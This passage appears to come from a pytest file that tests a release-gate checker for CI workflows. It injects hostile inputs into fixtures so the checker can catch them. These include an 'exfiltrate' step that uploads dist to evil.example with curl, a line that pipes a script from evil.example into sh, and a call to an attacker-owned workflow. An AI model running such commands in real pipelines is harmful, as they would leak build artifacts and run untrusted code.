              'nix build ".#$pkg" --rebuild --no-link ; true')
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_widened_suffix_the_echo_disarm_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "DISARM_SUFFIX", NARROW_SUFFIX)
    tree.edit(WORKFLOW, 'nix build ".#$pkg" --rebuild --no-link',
              'nix build ".#$pkg" --rebuild --no-link || echo skipped')
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_ref_aware_pattern_the_pinned_caller_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "CALLED", NARROW_CALLED)
    tree.append(CALLER, "  extra:\n    uses: attacker/repo/.github/workflows/evil.yml@v1\n")
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_caller_steps_clause_the_callers_own_step_stands(tree, monkeypatch):
    gone(monkeypatch, "check_caller_steps")
    tree.append(CALLER, "  extra:\n    runs-on: ubuntu-latest\n    steps:\n"
                        "      - name: exfiltrate\n        run: curl -T dist https://evil.example\n")
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_widened_hexrun_the_six_character_revision_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "HEXRUN", NARROW_HEXRUN)
    # In the checksums step, which has no `for pkg in`: an abbreviation that
    # happens to be all digits is a typed count to the rule beside this one, and
    # that would redden the arm for a reason it is not about.
    tree.edit(WORKFLOW, "          cd dist",
              f"          echo built at {tree.head()[:6]}\n          cd dist")
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_shape_test_the_variable_directory_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "UNNAMEABLE", NARROW_UNNAMEABLE)
    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
              '            d=dist\n'
              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
              '            cp "$out/$pkg.elf" "$d/"')
    tree.regenerate()
    assert tree.problems() == []


def test_without_the_write_verbs_a_removal_is_a_publication(tree, monkeypatch):
    """The harvest's arm. Not a deletion — the clause IS the narrowing, so the
    arm is the wide reading it replaced, and the region then lists a file the
    release deletes."""
    monkeypatch.setattr(release_gate, "written",
                        lambda command: re.findall(r"(dist/[\w.${}<>-]+)", command))
    tree.edit(WORKFLOW, "          mkdir -p dist",
              "          mkdir -p dist\n          rm -f dist/leftover.tmp")
    tree.regenerate()
    assert "leftover.tmp" in published_line(tree)


def test_without_the_spelling_set_the_other_frontier_words_stand(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "FRONTIER_SPELLINGS", NARROW_SPELLINGS)
    monkeypatch.setattr(release_gate, "SUBJECTS",
                        {**release_gate.SUBJECTS, "source-to-binary": "x"})
    tree.regenerate()
    assert tree.problems() == []


def test_the_shared_reader_is_what_truncated_the_payload():
    """The `commands()` arm, stated over the reader it stopped using: this is the
    text `gate_lines.split_at_comment` returns for the same line, and it is why a
    quote-blind cut is a mis-read here rather than a residue."""
    line = 'echo "tag # done"; curl -s https://evil.example/p | sh'
    assert gate_lines.split_at_comment(line)[0] == 'echo "tag'
    assert release_gate.commands(line + "\n") == [line]


# --- how this generator registers ----------------------------------------------


def test_the_page_stays_under_the_claims_rule(tree):
    """A REGION and not an `ARTIFACT`/`GENERATED_BY` pair, and this is the
    difference: that pair excuses a page WHOLE from `claims_gate`, and
    `docs/supply-chain.md` is prose that must stay in its corpus. Measured on the
    real checkout — 66 pages either way — and asserted here so a later edit that
    "registers the generator like the others" is a red, not a quiet exemption.
    """
    source = (ROOT / "scripts/release_gate.py").read_text()
    assert 'ARTIFACT = pathlib.Path(' not in source
    assert "\nGENERATED_BY = " not in source
    assert PAGE not in claims_gate.generated_pages(ROOT)


def test_the_region_is_masked_out_of_the_claims_corpus():
    """The mechanism that replaces the whole-page exemption: `claims_gate` blanks
    a `<!-- name:start -->` region wherever it finds one, so what this generator
    writes is not read as somebody's hand-written sentence."""
    text = claims_gate.normalise((ROOT / PAGE).read_text())
    assert "release-manifest:start" in text
    sentinel = "This is a recipe, not a record."
    assert text.count(sentinel) == 1, "the sentinel must live only in the region"
    masked = claims_gate.mask_regions(text)
    assert sentinel not in masked
    # The mask replaces a region with its own newline count, so every line number
    # a claims finding cites still points where a reader would look.
    assert masked.count("\n") == text.count("\n")


def test_the_shipped_map_cannot_derive_the_frontier():
    """Structural, over the shipped constants rather than a fixture: the whole
    argument that no entry can claim `source->binary` rests on it."""
    assert release_gate.FRONTIER not in {s for _p, s in release_gate.SHAPE}
    assert release_gate.FRONTIER not in release_gate.SUBJECTS
    assert release_gate.UNSHAPED in release_gate.SUBJECTS


def test_check_assurance_sh_runs_this_row():
    """The row, with its flags — a name match cannot see a `--write` typed into
    the gate row, which would rewrite the page instead of diffing it."""
    text = (ROOT / "scripts/check-assurance.sh").read_text()
    assert gate_lines.runs(text, "scripts/release_gate.py")
    code = [gate_lines.split_at_comment(body)[0]
            for _indent, body in gate_lines.logical_lines(text)]
    rows = [line for line in code if "scripts/release_gate.py" in line]
    assert rows == ['run "release manifest"        python scripts/release_gate.py'], rows

